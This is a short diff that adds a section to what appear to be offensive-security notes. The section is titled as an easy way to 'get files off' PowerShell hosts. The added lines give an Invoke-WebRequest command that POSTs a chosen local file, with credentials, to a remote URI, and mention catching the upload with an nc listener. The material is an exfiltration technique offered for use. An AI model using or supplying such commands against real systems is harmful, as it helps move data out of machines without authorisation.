@@ -99,3 +99,12 @@ if __name__ == "__main__":
 ```
 
 Will do the job, minus base64
+
+On Powershell hosts, this is an easy way to get files off:
+
+```powershell
+$filepath = "file/to/send.txt"
+Invoke-WebRequest -uri $uri -Method POST -Infile $filepath -Credential $usercreds
+```
+
+I cheated and listened with nc to get it off, but you have options.
